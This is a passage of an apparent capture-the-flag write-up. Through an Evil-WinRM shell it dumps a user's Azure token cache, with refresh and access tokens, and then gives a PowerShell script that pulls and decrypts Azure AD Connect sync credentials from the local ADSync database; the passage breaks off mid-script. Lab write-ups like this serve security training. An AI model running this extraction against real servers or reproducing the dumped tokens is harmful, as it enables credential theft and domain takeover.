&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\Users\mhope\.Azure&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;d-----         1/3/2020   5:35 AM                ErrorRecords&lt;/span&gt;
&lt;span class="code-line"&gt;-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json&lt;/span&gt;
&lt;span class="code-line"&gt;-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json&lt;/span&gt;
&lt;span class="code-line"&gt;-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json&lt;/span&gt;
&lt;span class="code-line"&gt;-a----         1/3/2020   5:36 AM           7896 TokenCache.dat&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\mhope\.Azure&amp;gt; cat AzurePSDataCollectionProfile.json&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;enableAzureDataCollection&amp;quot;:true}&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\mhope\.Azure&amp;gt; cat AzureRmContext.json&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;DefaultContextKey&amp;quot;: &amp;quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;EnvironmentTable&amp;quot;: {},&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;Contexts&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;Account&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;Id&amp;quot;: &amp;quot;john@a67632354763outlook.onmicrosoft.com&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;Credential&amp;quot;: null,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;Type&amp;quot;: &amp;quot;User&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;TenantMap&amp;quot;: {},&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ExtendedProperties&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;Tenants&amp;quot;: &amp;quot;372efea9-7bc4-4b76-8839-984b45edfb98&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;        }&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;Tenant&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;Id&amp;quot;: &amp;quot;372efea9-7bc4-4b76-8839-984b45edfb98&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;Directory&amp;quot;: null,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ExtendedProperties&amp;quot;: {}&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;Subscription&amp;quot;: null,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;Environment&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;Name&amp;quot;: &amp;quot;AzureCloud&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;OnPremise&amp;quot;: false,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ServiceManagementUrl&amp;quot;: &amp;quot;https://management.core.windows.net/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ResourceManagerUrl&amp;quot;: &amp;quot;https://management.azure.com/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ManagementPortalUrl&amp;quot;: &amp;quot;https://go.microsoft.com/fwlink/?LinkId=254433&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;PublishSettingsFileUrl&amp;quot;: &amp;quot;https://go.microsoft.com/fwlink/?LinkID=301775&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ActiveDirectoryAuthority&amp;quot;: &amp;quot;https://login.microsoftonline.com/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;GalleryUrl&amp;quot;: &amp;quot;https://gallery.azure.com/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;GraphUrl&amp;quot;: &amp;quot;https://graph.windows.net/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ActiveDirectoryServiceEndpointResourceId&amp;quot;: &amp;quot;https://management.core.windows.net/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;StorageEndpointSuffix&amp;quot;: &amp;quot;core.windows.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;SqlDatabaseDnsSuffix&amp;quot;: &amp;quot;.database.windows.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;TrafficManagerDnsSuffix&amp;quot;: &amp;quot;trafficmanager.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;AzureKeyVaultDnsSuffix&amp;quot;: &amp;quot;vault.azure.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;AzureKeyVaultServiceEndpointResourceId&amp;quot;: &amp;quot;https://vault.azure.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;GraphEndpointResourceId&amp;quot;: &amp;quot;https://graph.windows.net/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;DataLakeEndpointResourceId&amp;quot;: &amp;quot;https://datalake.azure.net/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;BatchEndpointResourceId&amp;quot;: &amp;quot;https://batch.core.windows.net/&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix&amp;quot;: &amp;quot;azuredatalakeanalytics.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;AzureDataLakeStoreFileSystemEndpointSuffix&amp;quot;: &amp;quot;azuredatalakestore.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;AdTenant&amp;quot;: &amp;quot;Common&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;VersionProfiles&amp;quot;: [],&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ExtendedProperties&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;OperationalInsightsEndpoint&amp;quot;: &amp;quot;https://api.loganalytics.io/v1&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;OperationalInsightsEndpointResourceId&amp;quot;: &amp;quot;https://api.loganalytics.io&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;AzureAnalysisServicesEndpointSuffix&amp;quot;: &amp;quot;asazure.windows.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;AnalysisServicesEndpointResourceId&amp;quot;: &amp;quot;https://region.asazure.windows.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;AzureAttestationServiceEndpointSuffix&amp;quot;: &amp;quot;attest.azure.net&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;quot;AzureAttestationServiceEndpointResourceId&amp;quot;: &amp;quot;https://attest.azure.net&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;        }&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;VersionProfile&amp;quot;: null,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;TokenCache&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;CacheData&amp;quot;: null&lt;/span&gt;
&lt;span class="code-line"&gt;      },&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;quot;ExtendedProperties&amp;quot;: {}&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;  },&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;quot;ExtendedProperties&amp;quot;: {}&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\mhope\.Azure&amp;gt; cat AzureRmContextSettings.json&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;Mode&amp;quot;:&amp;quot;CurrentUser&amp;quot;,&amp;quot;ContextDirectory&amp;quot;:&amp;quot;C:\\Users\\mhope\\.Azure&amp;quot;,&amp;quot;ContextFile&amp;quot;:&amp;quot;AzureRmContext.json&amp;quot;,&amp;quot;CacheDirectory&amp;quot;:&amp;quot;C:\\Users\\mhope\\.Azure&amp;quot;,&amp;quot;CacheFile&amp;quot;:&amp;quot;TokenCache.dat&amp;quot;,&amp;quot;Settings&amp;quot;:{}}&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\mhope\.Azure&amp;gt; cat TokenCache.dat&lt;/span&gt;
&lt;span class="code-line"&gt;‡https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{&amp;quot;RefreshToken&amp;quot;:&amp;quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&amp;quot;,&amp;quot;ResourceInResponse&amp;quot;:&amp;quot;https:\/\/graph.windows.net\/&amp;quot;,&amp;quot;Result&amp;quot;:{&amp;quot;AccessToken&amp;quot;:&amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA&amp;quot;,&amp;quot;AccessTokenType&amp;quot;:&amp;quot;Bearer&amp;quot;,&amp;quot;ExpiresOn&amp;quot;:{&amp;quot;DateTime&amp;quot;:&amp;quot;\/Date(1578062173584)\/&amp;quot;,&amp;quot;OffsetMinutes&amp;quot;:0},&amp;quot;ExtendedExpiresOn&amp;quot;:{&amp;quot;DateTime&amp;quot;:&amp;quot;\/Date(1578062173584)\/&amp;quot;,&amp;quot;OffsetMinutes&amp;quot;:0},&amp;quot;ExtendedLifeTimeToken&amp;quot;:false,&amp;quot;IdToken&amp;quot;:&amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&amp;quot;,&amp;quot;TenantId&amp;quot;:&amp;quot;372efea9-7bc4-4b76-8839-984b45edfb98&amp;quot;,&amp;quot;UserInfo&amp;quot;:{&amp;quot;DisplayableId&amp;quot;:&amp;quot;john@a67632354763outlook.onmicrosoft.com&amp;quot;,&amp;quot;FamilyName&amp;quot;:&amp;quot;Clark&amp;quot;,&amp;quot;GivenName&amp;quot;:&amp;quot;John&amp;quot;,&amp;quot;IdentityProvider&amp;quot;:&amp;quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&amp;quot;,&amp;quot;PasswordChangeUrl&amp;quot;:null,&amp;quot;PasswordExpiresOn&amp;quot;:null,&amp;quot;UniqueId&amp;quot;:&amp;quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&amp;quot;}},&amp;quot;UserAssertionHash&amp;quot;:null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{&amp;quot;RefreshToken&amp;quot;:&amp;quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&amp;quot;,&amp;quot;ResourceInResponse&amp;quot;:&amp;quot;https:\/\/management.core.windows.net\/&amp;quot;,&amp;quot;Result&amp;quot;:{&amp;quot;AccessToken&amp;quot;:&amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw&amp;quot;,&amp;quot;AccessTokenType&amp;quot;:&amp;quot;Bearer&amp;quot;,&amp;quot;ExpiresOn&amp;quot;:{&amp;quot;DateTime&amp;quot;:&amp;quot;\/Date(1578062154521)\/&amp;quot;,&amp;quot;OffsetMinutes&amp;quot;:0},&amp;quot;ExtendedExpiresOn&amp;quot;:{&amp;quot;DateTime&amp;quot;:&amp;quot;\/Date(1578062154521)\/&amp;quot;,&amp;quot;OffsetMinutes&amp;quot;:0},&amp;quot;ExtendedLifeTimeToken&amp;quot;:false,&amp;quot;IdToken&amp;quot;:&amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&amp;quot;,&amp;quot;TenantId&amp;quot;:&amp;quot;372efea9-7bc4-4b76-8839-984b45edfb98&amp;quot;,&amp;quot;UserInfo&amp;quot;:{&amp;quot;DisplayableId&amp;quot;:&amp;quot;john@a67632354763outlook.onmicrosoft.com&amp;quot;,&amp;quot;FamilyName&amp;quot;:&amp;quot;Clark&amp;quot;,&amp;quot;GivenName&amp;quot;:&amp;quot;John&amp;quot;,&amp;quot;IdentityProvider&amp;quot;:&amp;quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&amp;quot;,&amp;quot;PasswordChangeUrl&amp;quot;:null,&amp;quot;PasswordExpiresOn&amp;quot;:null,&amp;quot;UniqueId&amp;quot;:&amp;quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&amp;quot;}},&amp;quot;UserAssertionHash&amp;quot;:null}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="password-hash-synchronisation"&gt;Password Hash Synchronisation&lt;/h2&gt;
&lt;p&gt;A few goolge search lead us to this article about
&lt;a href="https://blog.xpnsec.com/azuread-connect-for-redteam/"&gt;Azure AD Connect for Red Teamers&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We try the POC in the article on our box but the first line seems wrong as we
get an error when we try to connect to the local DB. The trick is to use
&lt;code&gt;trusted_connection&lt;/code&gt; and to have the &lt;code&gt;Data source&lt;/code&gt; set to &lt;code&gt;.&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then we easily retrive the administrator password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:&amp;gt; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &amp;quot;Data Source=.;Initial Catalog=ADSync;trusted_connection=true;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $client.Open()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $cmd = $client.CreateCommand()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $cmd.CommandText = &amp;quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $reader = $cmd.ExecuteReader()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $reader.Read() | Out-Null&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $key_id = $reader.GetInt32(0)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $instance_id = $reader.GetGuid(1)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $entropy = $reader.GetGuid(2)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $reader.Close()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $cmd = $client.CreateCommand()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $cmd.CommandText = &amp;quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &amp;#39;AD&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $reader = $cmd.ExecuteReader()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $reader.Read() | Out-Null&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $config = $reader.GetString(0)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $crypted = $reader.GetString(1)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $reader.Close()&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; add-type -path &amp;#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $km.LoadKeySet($entropy, $instance_id, $key_id)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $key = $null&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $km.GetActiveCredentialKey([ref]$key)&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $key2 = $null&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:&amp;gt; $km.GetKey(1, [ref]$key2)&lt;/span&gt;
